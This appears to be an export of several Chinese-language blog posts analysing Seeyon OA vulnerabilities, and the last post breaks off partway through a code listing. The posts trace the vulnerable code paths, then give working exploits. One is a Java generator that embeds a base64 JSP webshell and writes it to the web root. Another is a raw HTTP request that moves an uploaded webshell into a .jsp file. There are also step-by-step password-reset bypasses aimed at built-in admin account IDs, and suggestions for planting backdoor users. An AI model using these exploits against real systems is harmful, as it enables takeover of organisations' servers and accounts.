argTypes[i]);                    &#125;                &#125;            &#125; catch (Exception var13) &#123;                LOGGER.warn(var13.getLocalizedMessage(), var13);                continue;            &#125;            data.put(\"method\", method);            data.put(\"args\", args);            break;        &#125;        return data;    &#125;\n\ncandidateMethods列表保存的为根据特定条件或者是缓存中获取到的方法集合，这个方法的作用其实就是从candidateMethods列表中，根据传入的paramObject参数列表获取到对应的方法和参数值，会根据参数的值解析成对应的对象。\n接着在 464 行 执行了反射调用\n\n\n\n\n\n\n\n以上就是Ajax.do 接口反射调用任意类任意方法及指定参数的分析过程。\n通过ajax.do接口指定method参数为ajaxAction调用AjaxController类的ajaxAction方法，这个方法中又调用了AjaxController的invokeService方法，这个方法可以根据类名获取到该类的一个实例，进而调用了AjaxController的invokeMethod方法，进而反射调用该实例的方法。在这个过程中，反射调用所需的类名、方法名、参数都可以从request中获取到。要进行进一步利用需要找到存在一些危险操作的方法进行利用，如文件上传、文件写入、命令执行、代码执行等，如本次利用到的FormulaManagerImpl这个类。\nFormulaManagerImpl分析\nFormulaManagerImpl.validate(Formula formula, String expression, Map context, boolean isSave)\n\n\n\n\n\n\n\n调用了FormulaUtil.validate，跟入\ncom.seeyon.ctp.common.formula.FormulaUtil#validate(com.seeyon.ctp.common.po.formula.Formula, java.lang.String, java.util.Map, boolean)\npublic static boolean validate(Formula formula, String expression, Map context, boolean isSave) throws BusinessException &#123;        Object obj = null;        if (formula.getFormulaType() != FormulaType.GroovyFunction.getKey() &amp;&amp; formula.getFormulaType() != FormulaType.Variable.getKey()) &#123;            return false;        &#125; else &#123;            try &#123;                String script = formula.toString() + \";\" + expression;                // 执行groovy脚本                obj = eval(script, context);                validateReturnType(formula, obj);            &#125; catch (ScriptException var7) &#123;                LOG.error(ResourceUtil.getString(\"ctp.formulas.error.chekcFailed\"), var7);                throw new BusinessException(\"ctp.formulas.error.chekcFailed\");            &#125; catch (StackOverflowError var8) &#123;                LOG.error(\"校验Groovy函数错误:\", var8);                throw new BusinessException(\"堆栈溢出，请检查是否有递归调用。\");            &#125;            if (!isSave &amp;&amp; null != formula.getExpectValue()) &#123;                if (formula.getReturnType() != DataType.DateTime.getKey() &amp;&amp; formula.getReturnType() != DataType.Date.getKey()) &#123;                    if (!obj.toString().equals(formula.getExpectValue())) &#123;                        throw new BusinessException(\"示例校验成功,检验结果与期望值不符,请检查!\");                    &#125;                &#125; else &#123;                    try &#123;                        if (!DateUtil.parse(formula.getExpectValue()).equals(obj)) &#123;                            throw new BusinessException(\"示例校验成功,检验结果与期望值不符,请检查!\");                        &#125;                    &#125; catch (ParseException var6) &#123;                        LOG.error(var6.getLocalizedMessage(), var6);                        throw new BusinessException(\"示例校验成功,检验结果与期望值不符,请检查!\");                    &#125;                &#125;            &#125;            return true;        &#125;    &#125;\n\npublic static Object eval(String scriptText, Map context) throws ScriptException, BusinessException &#123;        log(scriptText);        Map ctx = new HashMap(getFormulaContext());        ctx.putAll(context);        return ScriptEvaluator.getInstance(true).eval(\"import com.seeyon.ctp.common.AppContext;import static com.seeyon.ctp.common.formula.runtime.CtpFormula.*;\" + scriptText, ctx);    &#125;\n\n这个方法的作用就是构造groovy脚本，调用eval方法执行。\n要利用FormulaUtil.validate方法，需要传入Formula对象、String expression, Map context, boolean isSave。\n需要绕过的几个限制\nif (formula.getFormulaType() != FormulaType.GroovyFunction.getKey() &amp;&amp; formula.getFormulaType() != FormulaType.Variable.getKey()) &#123;            return false;&#125;\n\n\n\n\n\n\n\n\n在执行到eval方法前，Formula对象的formulaType值要为1或者2才不会return出去。\n在eval方法中执行了log方法\n\n\n\n\n\n\n\nprivate static void log(String script) throws BusinessException &#123;        Iterator var1 = SCRIPT_BLACKLIST.iterator();        String keyword;        do &#123;            if (!var1.hasNext()) &#123;                SCRIPTLOG.info(Strings.getRemoteAddr(WebUtil.getRequest()) + \",\" + AppContext.currentUserLoginName() + \",\" + script);                return;            &#125;            keyword = (String)var1.next();        &#125; while(script.indexOf(keyword) &lt;= -1);        throw new BusinessException(\"脚本中不允许使用：\" + keyword);    &#125;\n\nlog方法主要是对脚本中的内容进行检测，不运行字符串中出现如下字符，但是不够严谨，可以用其他方法代替黑名单中的方法。\n\n\n\n\n\n\n\n因为是调用的formula.toString方法\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n可以通过this.formulaExpression来传入我们想要执行的代码。\n最后根据如上条件，我写了一个生成arguments参数的方法，可在payload自定义想要执行的代码。\npackage com.example.Test;import com.seeyon.ctp.common.formula.FormulaUtil;import com.seeyon.ctp.common.log.CtpLogFactory;import com.seeyon.ctp.common.po.formula.Formula;import com.seeyon.ctp.common.script.ScriptEvaluator;import com.seeyon.ctp.util.ZipUtil;import com.seeyon.ctp.util.json.JSONUtil;import org.apache.commons.logging.Log;import java.net.URLEncoder;import java.util.ArrayList;import java.util.HashMap;public class Test &#123;    private static final Log LOGGER = CtpLogFactory.getLog(Test.class);    public static void main(String[] args) throws Exception&#123;        final Formula formula = new Formula();        //         if (formula.getFormulaType() != FormulaType.GroovyFunction.getKey() &amp;&amp; formula.getFormulaType() != FormulaType.Variable.getKey()) &#123;        formula.setFormulaType(2);        formula.setFormulaName(\"test\");        String payload = \"\" +                \"def filePath = \\\"../webapps/ROOT/mzr2.j\"+\"sp\\\";\" +                \"java.io.File file = new java.io.File(filePath);\" +                \"String shell=\\\"PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmEuaW8uKixqYXZheC5jcnlwdG8uKixqYXZheC5jcnlwdG8uc3BlYy4qIiU+PCUhY2xhc3MgVSBleHRlbmRzIENsYXNzTG9hZGVyIHsKCQlVKENsYXNzTG9hZGVyIGMpIHsKCQkJc3VwZXIoYyk7CgkJfQoJCXB1YmxpYyBDbGFzcyBnKGJ5dGVbXSBiKSB7CgkJCXJldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLCAwLCBiLmxlbmd0aCk7CgkJfQoJfSU+CjwlCnRyeXsKCQlTdHJpbmcga2V5PSI5MDBiYzg4NWQ3NTUzMzc1IjsKCQlyZXF1ZXN0LnNldEF0dHJpYnV0ZSgic2t5Iiwga2V5KTsKCQlTdHJpbmcgZGF0YT1yZXF1ZXN0LmdldFJlYWRlcigpLnJlYWRMaW5lKCk7CgkJaWYgKGRhdGEhPSBudWxsKSB7CgkJCVN0cmluZyB2ZXIgPSBTeXN0ZW0uZ2V0UHJvcGVydHkoImphdmEudmVyc2lvbiIpOwoJCQlieXRlW10gY29kZT1udWxsOwoJICAgICAgICBpZiAodmVyLmNvbXBhcmVUbygiMS44IikgPj0gMCkgewoJICAgICAgICAgICAgQ2xhc3MgQmFzZTY0ID0gQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkJhc2U2NCIpOwoJICAgICAgICAgICAgT2JqZWN0IERlY29kZXIgPSBCYXNlNjQuZ2V0TWV0aG9kKCJnZXREZWNvZGVyIiwgKENsYXNzW10pIG51bGwpLmludm9rZShCYXNlNjQsIChPYmplY3RbXSkgbnVsbCk7CgkgICAgICAgICAgICBjb2RlID0gKGJ5dGVbXSkgRGVjb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZGVjb2RlIiwgbmV3IENsYXNzW117Ynl0ZVtdLmNsYXNzfSkuaW52b2tlKERlY29kZXIsIG5ldyBPYmplY3RbXXtkYXRhLmdldEJ5dGVzKCJVVEYtOCIpfSk7CgkgICAgICAgIH0gZWxzZSB7CgkgICAgICAgICAgICBDbGFzcyBCYXNlNjQgPSBDbGFzcy5mb3JOYW1lKCJzdW4ubWlzYy5CQVNFNjREZWNvZGVyIik7CgkgICAgICAgICAgICBPYmplY3QgRGVjb2RlciA9IEJhc2U2NC5uZXdJbnN0YW5jZSgpOwoJICAgICAgICAgICAgY29kZSA9IChieXRlW10pIERlY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImRlY29kZUJ1ZmZlciIsIG5ldyBDbGFzc1tde1N0cmluZy5jbGFzc30pLmludm9rZShEZWNvZGVyLCBuZXcgT2JqZWN0W117ZGF0YX0pOwoJICAgICAgICB9CgkJCUNpcGhlciBjID0gQ2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTsKCQkJYy5pbml0KDIsIG5ldyBTZWNyZXRLZXlTcGVjKGtleS5nZXRCeXRlcygpLCAiQUVTIikpOwoJCQluZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhjLmRvRmluYWwoY29kZSkpLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTsKCQl9Cgl9Y2F0Y2goRXhjZXB0aW9uIGUpewp9OwpvdXQ9cGFnZUNvbnRleHQucHVzaEJvZHkoKTsKJT4=\\\";\"+                \"sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();\" +                \"String decodeString = new String(decoder.decodeBuffer(shell),\\\"UTF-8\\\");\"+                \"file &lt;&lt; decodeString;&#125;;\" +                \"test();\" +                \"def static xxx()&#123;\";        formula.setFormulaExpression(payload);        final String string = JSONUtil.toJSONString(formula);//        System.out.println(string);        final ArrayList&lt;Object&gt; list = new ArrayList&lt;&gt;();        list.add(formula);        list.add(\"\");        list.add(new HashMap&lt;&gt;());        list.add(true);        final String list1 = JSONUtil.toJSONString(list);//        System.out.println(list1);        String strArgs = ZipUtil.compressResponse(list1, \"gzip\", \"UTF-8\", LOGGER);//        System.out.println(strArgs);        System.out.println(URLEncoder.encode(strArgs));        System.out.println(\"end\");    &#125;&#125;\n\n","categories":["代码审计","漏洞分析"],"tags":["java代码审计"]},{"title":"致远OA personalBind任意用户密码修改","url":"/2024/03/13/%E8%87%B4%E8%BF%9COA%20personalBind%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/","content":"漏洞环境seeyon 8.1 sp2\n分析密码重置接口逻辑\n/seeyon/individualManager.do?method=resetPassword\n\n对应com.seeyon.v3x.personalaffair.controller.IndividualManagerController类的resetPassword方法\n从代码中不难看出，需要longName不为null、canModify参数为true 才会进入到重置密码的功能点，canModify和loginName是从session中获取。\n在致远中修改密码的流程中，首先是需要输入对应的手机号或者邮箱信息，提交修改密码请求后，服务端会向对应手机号或者邮箱发送验证码信息，用户获取到验证码再提交是否正确，验证成功后会将用户名存放至session中，并在session中添加canModify为true代表已经成功验证，最后请求如下接口修改密码；修改密码的逻辑并没有什么问题，存在问题的点在于校验验证码的功能点。\n\n\n\n\n\n\n\n校验验证码接口\n/seeyon/personalBind.do?method=sendVerificationCodeToBindNum&amp;type=validate\n\n对应com.seeyon.v3x.personalaffair.controller.PersonalBindController的sendVerificationCodeToBindNum方法\n在286行处，漏洞的关键点在于从request中获取了origin参数，值为zx，那么就会在session中设置canModify为true，进入此处，只需要设置type为validate即可。\n\n\n\n\n\n\n\n上面的密码重置逻辑和校验验证码逻辑可以看出都是基于同一个Session下进行操作，都是从session中获取用户的信息。\ngetBindTypeByLoginName方法就是从request中获取loginName， 并将loginName存入Session中。\n\n\n\n\n\n\n\n\n\n\n最后访问/seeyon/personalBind.do?method=retrievePassword，输入目标系统中存在的用户名，提交，就会自动将信息绑定到Session中。\n\n\n\n\n\n\n\n漏洞复现访问/seeyon/personalBind.do?method=retrievePassword，输入系统中已有的用户名并提交\n\n\n\n\n\n\n\n访问/seeyon/personalBind.do?method=sendVerificationCodeToBindNum&amp;type=validate&amp;origin=zx 在session中将canModify设置为true\n\n\n\n\n\n\n\n最后 访问重置密码接口/seeyon/individualManager.do?method=resetPassword&amp;nowpwd=123456 \n\n\n\n\n\n\n\n修改成功\n","categories":["代码审计","漏洞分析"],"tags":["java代码审计"]},{"title":"致远OA constDef.do命令执行漏洞分析","url":"/2023/12/15/%E8%87%B4%E8%BF%9COA%20constDef.do%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","content":"漏洞接口/constDef.do?method=newConstDef\n\n该接口对应 com.seeyon.ctp.view.modules.operationcenter.constdef.controller.ConstDefController的newConstDef方法。\n该方法接收了一些参数，创建了ConstDef对象，调用了this.constDefManager.insertConstDef(def)方法进行插入。\n\n\n\n\n\n\n\n该方法中对constKey、constDefine参数进行验证，然后调用了this.findByConstKey(def.getConstKey())\n\n\n\n\n\n\n\n该方法会以构建一个ConstDef对象，设置constKey，然后调用this.constDefDao.findByExample(def)，这个方法会以constKey查找一组ConstDef对象，再以ConstDef对象作为参数调用this.updateConstValue(result)。\n\n\n\n\n\n\n\n通过this.constDefDao.findByExample(def)找到ConstDef对象的情况下，会以该对象的constKey调用ConstDefUtil.getConstDefValue(def.getConstKey())方法。\n\n\n\n\n\n\n\n继续以constKey作为参数调用了ConstDefCacheManager.getInstance().getConstDefValue(constKey)\n\n\n\n\n\n\n\n该方法首先会通过constkey作为参数在this.cacheMap中获取ConstDef对象，this.cacheMap中保存的为之前插入的ConstDef对象。拿到ConstDef对象后，使用ConstDef对象作为参数调用this.computeConstValue(def)方法。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n在computeConstValue方法中，能看到两处调用evalString和eval方法\n\n\n\n\n\n\n\n\n\n\n通过constDefine作为参数，使用groovy计算表达式。\n\n\n\n\n\n\n\n要想进入到groovy命令执行的方法调用中，需要constDefine的值中包含$，且constType需要指定为3或者4。\n\n\n\n\n\n\n\n首先会调用_parserRefKey方法对constDefine进行解析。会通过$界定一组关键字，如$a$，最终会在refs中添加a。\n\n\n\n\n\n\n\n调用ScriptEvaluator.getInstance().evalString(constDefine, context)。使用&quot;进行包裹，进而调用了this.eval()\n\n\n\n\n\n\n\n最后就进入到Groovy命令执行漏洞利用点。\n\n\n\n\n\n\n\n在ScriptEvaluator.getInstance().evalString(constDefine, context) 执行这里面会通过&quot;把scriptText包裹起来，如果直接传入java.lang.Runtime.getRuntime().exec(\\&quot;calc\\&quot;);会报错，可指定constType=3，也可通过如下方式进行拼接即可绕过。\n&quot;+&quot;java.lang.Runtime.getRuntime().exec(&quot;calc&quot;);//$a\\&quot;\n\n这里漏洞的利用，需要提交3次请求，第一次请求需要随机指定一个constKey和constDefine进行提交。\n如果不指定直接提交会提示{&quot;error&quot;:&quot;操作异常操作失败, 常量引用不存在&quot;}。\n\n\n\n\n\n\n\n所以第二次提交需要在$xx$中引用第一次提交的constKey，但是这一次提交不会触发命令执行，因为在调用this.constDefDao.findByExample(def)进行查找的时候，因为constDefDao中不存在第二次提交的constKey，所以不会进入updateConstValue的if条件中。只有第三次提交，才会从获取到第二次提交的ConstDef对象，进入updateConstValueif条件中，进而触发命令执行。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n问题ctp_const_def表中保存的是ConstDef对象各个属性的值，CONST_DEFINE字段中保存的是constDefine的值，但是该字段限制最大长度为200。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n漏洞进一步利用由于CONST_DEFINE保存的是执行的代码，需要先插入到数据库中，再取出执行，该字段规则限制的长度为200。为了绕过该规则，可以通过上传一个后缀为png，内容为webshell的文件，然后再通过执行代码的方式将文件从上传路径移动到web路径实现RCE。\njava.io.File file = new java.io.File(\"..\\\\..\\\\base\\\\upload\\\\2023\\\\12\\\\15\\\\8115437553340205223\");java.io.File endFile = new java.io.File(\"..\\\\webapps\\\\ROOT\\\\666.jsp\");file.renameTo(endFile);//$b1$\n\nPOST /seeyon/constDef.do HTTP/1.1Host: 172.20.10.133Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: ts=1702625401543; JSESSIONID=0AD7C82F3D4D8EA1B6FA9E28132C4BD2; loginPageURL=; login_locale=zh_CNx-forwarded-for: 127.0.0.1x-originating-ip: 127.0.0.1x-remote-ip: 127.0.0.1x-remote-addr: 127.0.0.1Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 640method=newConstDef&amp;constKey=f5&amp;constDefine=%6a%61%76%61%2e%69%6f%2e%46%69%6c%65%20%66%69%6c%65%20%3d%20%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%46%69%6c%65%28%22%2e%2e%5c%5c%2e%2e%5c%5c%62%61%73%65%5c%5c%75%70%6c%6f%61%64%5c%5c%32%30%32%33%5c%5c%31%32%5c%5c%31%35%5c%5c%38%31%31%35%34%33%37%35%35%33%33%34%30%32%30%35%32%32%33%22%29%3b%6a%61%76%61%2e%69%6f%2e%46%69%6c%65%20%65%6e%64%46%69%6c%65%20%3d%20%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%46%69%6c%65%28%22%2e%2e%5c%5c%77%65%62%61%70%70%73%5c%5c%52%4f%4f%54%5c%5c%36%36%36%2e%6a%73%70%22%29%3b%66%69%6c%65%2e%72%65%6e%61%6d%65%54%6f%28%65%6e%64%46%69%6c%65%29%3b%2f%2f%24%62%31%24&amp;constType=3\n\n","categories":["代码审计","漏洞分析"],"tags":["java代码审计"]},{"title":"致远OA rest接口重置密码漏洞分析","url":"/2023/10/07/%E8%87%B4%E8%BF%9COA%20rest%E6%8E%A5%E5%8F%A3%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","content":"复现环境致远 V7.1SP1\n补丁分析致远官方在2023年8月发布了rest接口重置密码漏洞补丁，补丁链接https://service.seeyon.com/patchtools/tp.html#/patchList?type=%E5%AE%89%E5%85%A8%E8%A1%A5%E4%B8%81&amp;id=175\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n致远是通过jersey框架实现REST接口，通过配置init-param参数来添加过滤器类，添加后，在进入到资源类之前，会先进入到过滤器类，一些校验的逻辑就可以写在过滤器中。\n\n\n\n\n\n\n\nrest接口重置密码漏洞补丁的工作原理是通过将用户角色权限与资源访问权限的逻辑写在ResourceCheckRoleAccessFilter类中，在ResourceCheckRoleAccessFilter的filter方法中，会以访问资源类的类名及方法名和当前用户作为参数调用RestCheckRoleAccessManagerImpl的checkRole方法，验证当前用户是否具有访问资源类的权限，如果不具备访问权限，则抛出异常。\n\n\n\n\n\n\n\n在补丁包中checkRoleAccessInfo.properties配置文件中，定义了com.seeyon.ctp.rest.resources.MemberResource类中方法已经对应的用户访问权限。\n\n\n\n\n\n\n\n在MemberResource.class的changePassword方法中，可通过指定memberid和password对用户密码进行修改。\n\n\n\n\n\n\n\n致远中存在一些自带的用户，这些用户的memberid值都是固定的，正常情况下，我们可以通过changePassword方法修改system等用户的密码。\n\n\n\n\n\n\n\nseeyon-guest -6964000252392685202system -7273032013234748168audit-admin -4401606663639775639group-admin 5725175934914479521\n\nrest接口权限校验在CTPSecurityFilter.class的doFilter方法中，根据uri的特征，分别有7种权限校验的方法。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n当uri的前缀为/seeyon/rest/时，会调用RestAuthenticator.class的authenticate方法进行验证，该接口仅支持token进行认证，不允许使用Session。\n\n\n\n\n\n\n\n在致远的开放平台描述了toekn的获得方式，https://open.seeyon.com/book/ctp/restjie-kou/gai-shu.html\n\n\n\n\n\n\n\n两个步骤，1、登录系统用户创建一个rest用户，\n\n\n\n\n\n\n\n2、通过/seeyon/rest/token/{restusername}/{password}接口获取token\n\n\n\n\n\n\n\n获取到token以后，就可以调用changePassword方法修改密码了，调用路径/seeyon/rest/orgMember/{id}/password/{password}，这里将system用户密码修改为123456。\n\n\n\n\n\n\n\n通过system管理员创建rest用户，在通过rest用户获取token，最后通过token访问接口修改密码，利用的前提需要一个管理员账号，难免有些鸡肋。而访问rest接口只能是token，而token只能通过管理员创建rest用户拿到，看起来是个死结，实际上大佬们的思路是另辟蹊径。\n权限绕过回到CTPSecurityFilter.class的doFilter方法中，在进入到rest接口的权限校验方法前，会先判断是不是SpringController的请求。\n\n\n\n\n\n\n\n当uri的后缀为.do或者 .do;jessionid=的时候，那么就会进入到SpringControllerAuthenticator的authenticate方法中进行验证。\n\n\n\n\n\n\n\n而rest接口修改密码的路由为/seeyon/rest/orgMember/-7273032013234748168/password/123456，123456为我们需要修改的密码，当把密码写成123456.do或者123456.do;jessionid= ，即可让该请求走SpringControllerAuthenticator的authenticate方法中进行验证，所以只需要普通用户的权限就可以修改管理员的密码。\n\n\n\n\n\n\n\n武器化利用思考致远中存在一些接口，是可以RCE的，但是设置了访问权限，当拿到管理员权限以后，我们可以通过管理员权限为普通用户赋予一些访问权限，然后调用这些接口实现RCE，另一个是通过管理员权限创建普通用户留后门。\n修复在致远 8.2之后版本的CTPSecurityFilter.class中，除验证uri路径以.do结尾以外，还验证了该uri是否为rest接口，限制了普通用户禁止通过SpringController的验证逻辑去访问rest接口。\n\n\n\n\n\n\n\n","categories":["代码审计","漏洞分析"],"tags":["java代码审计"]},{"title":"致远OA ofd解压漏洞分析","url":"/2023/08/07/%E8%87%B4%E8%BF%9COA%20ofd%E8%A7%A3%E5%8E%8B%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","content":"环境A8+集团版V8.0SP2\n补丁对比下载官网补丁\nhttps://service.seeyon.com/patchtools/tp.html#/patchList?type=%E5%AE%89%E5%85%A8%E8%A1%A5%E4%B8%81&amp;id=166\n\n\n\n\n\n\n\n通过与A8+集团版V8.0SP2 中的seeyon-apps-edoc/com/seeyon/apps/govdoc/gb/util/OfdJavaZipUtil.class 对比\n\n\n\n\n\n\n\n漏洞分析发现在OfdJavaZipUtil.class#unzip方法中有一处明显改动\n在遍历压缩包内文件时，最新补丁做了如下改动\npublic static void unzip(String fileName, String path, Map&lt;String, String&gt; charsetMap) &#123;    try &#123;        ZipFile zf = getZipFile(new File(fileName), charsetMap);        Enumeration en = zf.entries();        while(en.hasMoreElements()) &#123;            ZipEntry zn = (ZipEntry)en.nextElement();            File f = new File(path, zn.getName());            File f1 = new File(Strings.getCanonicalPath(f.getPath()));            if (!FileUtil.inDirectory(f1, new File(path))) &#123;                LOGGER.error(\"发现文件解压漏洞攻击行为： \" + AppContext.currentUserName() + \" 文件路径：\" + f1.getAbsolutePath());                return;            &#125;            ...\n\n判断当前遍历的文件路径是否在指定的路径path下，如果不在则不继续执行操作。\nV8.0SP2 中的unzip方法\npublic static void unzip(String fileName, String path, Map&lt;String, String&gt; charsetMap) &#123;    FileOutputStream fos = null;    InputStream is = null;    try &#123;        ZipFile zf = getZipFile(new File(fileName), charsetMap);        Enumeration en = zf.entries();        while(true) &#123;            ZipEntry zn;            do &#123;                do &#123;                    if (!en.hasMoreElements()) &#123;                        return;                    &#125;                    zn = (ZipEntry)en.nextElement();                &#125; while(zn.isDirectory());            &#125; while(\".ofd\".equals(zn.getName()));            is = zf.getInputStream(zn);            File f = new File(path + zn.getName());            File file = f.getParentFile();            file.mkdirs();            fos = new FileOutputStream(path + zn.getName());            int len = false;            byte[] bufer = new byte[BUFFERSIZE];            int len;            while(-1 != (len = is.read(bufer))) &#123;                fos.write(bufer, 0, len);            &#125;            is.close();            fos.close();        &#125;            ...\n\n在之前的版本中，并没有验证压缩包中文件路径是否存在传入的path路径中，并且在104行处\n\n\n\n\n\n\n\n直接将压缩包内文件名拼接到文件路径当中，然后再将压缩包内文件写入到该path+zn.getName()的新创建的文件中。\n这里如果我们在压缩包内构造一个文件名为../../test.jspx文件，在没有更新补丁情况下，可以将文件写入到任意路径下。\n以上，我们通过对比补丁，发现了OfdJavaZipUtil#unzip 解压文件名路径可控的漏洞利用的点，接下来，我们还需要找到fileName变量可控一条漏洞利用的路径。\n查找OfdJavaZipUtil调用\n\n\n\n\n\n\n\n在com/seeyon/apps/govdoc/gb/manager/impl/GovdocGBManagerImpl.java#getOfdMetadata中调用了OfdJavaZipUtil#unzip\nprivate Map&lt;String, Object&gt; getOfdMetadata(Long fileId, File sourceFile, boolean onlyRead, Map&lt;String, String&gt; charsetMap) throws BusinessException &#123;      new HashMap();      try &#123;         String sourceFilePath = sourceFile.getPath();         String unzipFilePath = SystemEnvironment.getSystemTempFolder() + File.separator + \"ofd\" + File.separator + fileId + File.separator;         OfdFileUtil.delFolder(unzipFilePath);         OfdJavaZipUtil.unzip(sourceFilePath, unzipFilePath, charsetMap);         String ofdxmlPath = unzipFilePath + File.separator + \"OFD.xml\";         Map&lt;String, Object&gt; metadataMap = OfdXmlUtil.getMetadataOfdXml(ofdxmlPath);         if (onlyRead) &#123;            OfdFileUtil.delFolder(unzipFilePath);         &#125;         return metadataMap;      &#125; catch (Exception var10) &#123;         LOGGER.error(\"获取OFD元数据失败\", var10);         throw new BusinessException();      &#125;   &#125;\n\n这个方法作用就是传入fileId和sourceFile，调用OfdJavaZipUtil.unzip对sourceFile解压，并获得解压路径下的OFD.xml中的数据。我们主要关注sourceFile变量是否可控，很显然，这个调用这个方法需要传入sourceFile。\n接下来，继续看哪儿调用了com/seeyon/apps/govdoc/gb/manager/impl/GovdocGBManagerImpl.java#getOfdMetadata\n\n\n\n\n\n\n\n总共两个调用\n1102行GovdocGBManagerImpl.java#getOfdMetadata(Long fileId)1133行GovdocGBManagerImpl.java#resetOfdMetadata(Long fileId, Map&lt;String, Object&gt; newmetadataMap)\n\n这里主要通过1102行的GovdocGBManagerImpl.java#getOfdMetadata(Long fileId)方法来触发调用。\n继续回溯\nGovdocGBManagerImpl.java#getOfdMetadata(Long fileId)\npublic Map&lt;String, Object&gt; getOfdMetadata(Long fileId) throws BusinessException &#123;    File file = this.fileManager.getFile(fileId);    if (file == null) &#123;        return null;    &#125; else &#123;        Map&lt;String, Object&gt; metaDataMap = this.getOfdMetadata(fileId, file, true, (Map)null);        return this.convertMetaDataMap(metaDataMap);    &#125;&#125;\n\n在这个方法中，通过fileId获取了对应的文件，这里获取到的文件则会传入到this.getOfdMetadata(fileId, file, true, (Map)null)中，即可作为我们上一个方法的sourceFile变量。\n所以，到这里，如果fileId可以通过外部控制，我们我们只需要找到一个可以上传zip文件的地方，并且获取到fileId，我们即可实现任意文件任意路径写入\n继续回溯\n在com/seeyon/apps/edoc/api/EdocApiImpl.java#getOfdMetaDataFromOfdFile(Long ofdFileId)调用了getOfdMetadata(ofdFileId)方法\n\n\n\n\n\n\n\n继续回溯\n在com/seeyon/ctp/common/content/mainbody/MainbodyController.java#invokingForm中\npublic ModelAndView invokingForm(HttpServletRequest request, HttpServletResponse response) throws BusinessException &#123;      ModelAndView content = null;      try &#123;         Map params = request.getParameterMap();         String isNew = ParamUtil.getString(params, \"isNew\", false);         long moduleId = ParamUtil.getLong(params, \"moduleId\", -1L, false);         Long formId = ParamUtil.getLong(params, \"formId\", -1L, false);         int moduleType = ParamUtil.getInt(params, \"moduleType\", -1, false);         String openFrom = ParamUtil.getString(params, \"openFrom\", false);         AppContext.putThreadContext(\"openFrom\", openFrom);         String contentDataId = ParamUtil.getString(params, \"contentDataId\", \"\");         AppContext.putThreadContext(\"contentDataId\", contentDataId);         String isFromFrReport = ParamUtil.getString(params, \"isFromFrReport\", false);         if (isFromFrReport != null) &#123;            Map p = new HashMap();            p.put(\"contentDataId\", moduleId);            List&lt;CtpContentAll&gt; contentList = DBAgent.findByNamedQuery(\"ctp_common_content_findByContentDataId\", p);            if (contentList == null || contentList.size() &lt;= 0) &#123;               throw new BusinessException(\"帆软报表穿透失败，未找到内容，内容ID：\" + moduleId);            &#125;            CtpContentAll tempContent = (CtpContentAll)contentList.get(0);            moduleId = tempContent.getModuleId();            moduleType = tempContent.getModuleType();         &#125;         String style = ParamUtil.getString(params, \"style\");         AppContext.putThreadContext(\"style\", style);         ModuleType mType = null;         if (moduleType != -1) &#123;            mType = ModuleType.getEnumByKey(moduleType);            if (mType == null) &#123;               throw new BusinessException(\"moduleType is not validate!\");            &#125;         &#125;         String rightId = ParamUtil.getString(params, \"rightId\", \"\", false);         Integer indexParam = ParamUtil.getInt(params, \"indexParam\", 0);         int viewState = ParamUtil.getInt(params, \"viewState\", 2);         Long fromCopy = ParamUtil.getLong(params, \"fromCopy\", -1L, false);         List&lt;CtpContentAllBean&gt; contentList = null;         CtpContentAllBean contentAll = null;         StringBuilder oldElementStr1 = new StringBuilder();         String rememberStyle;         if (isNew != null &amp;&amp; !\"false\".equals(isNew.trim())) &#123;            Map&lt;String, Object&gt; map = new HashMap();            rememberStyle = request.getParameter(\"distributeContentDataId\");            String distributeContentTemplateId = request.getParameter(\"distributeContentTemplateId\");            if (Strings.isNotBlank(rememberStyle)) &#123;               map.put(\"distributeContentDataId\", rememberStyle);            &#125;            if (Strings.isNotBlank(distributeContentTemplateId)) &#123;               map.put(\"distributeContentTemplateId\", distributeContentTemplateId);            &#125;            String forwardAffairId = request.getParameter(\"forwardAffairId\");            if (Strings.isNotBlank(forwardAffairId)) &#123;               AffairManager affairManager = (AffairManager)AppContext.getBean(\"affairManager\");               CtpAffair affair = affairManager.get(Long.valueOf(forwardAffairId));               map.put(\"forwardSubject\", affair.getSubject());            &#125;            map.put(\"formId\", formId);            map.put(\"oldSummaryId\", request.getParameter(\"oldSummaryId\"));            map.put(\"signSummaryId\", request.getParameter(\"signSummaryId\"));            map.put(\"forwardSummaryId\", request.getParameter(\"forwardSummaryId\"));            String summaryId = request.getParameter(\"summaryId\");            if (!Strings.isBlank(summaryId)) &#123;               map.put(\"oldSummaryId\", summaryId);            &#125;            String oldElementStr = ParamUtil.getString(params, \"oldElements\");            Map&lt;String, String&gt; oldElementMap = new HashMap();            if (Strings.isNotBlank(oldElementStr)) &#123;               try &#123;                  oldElementStr = 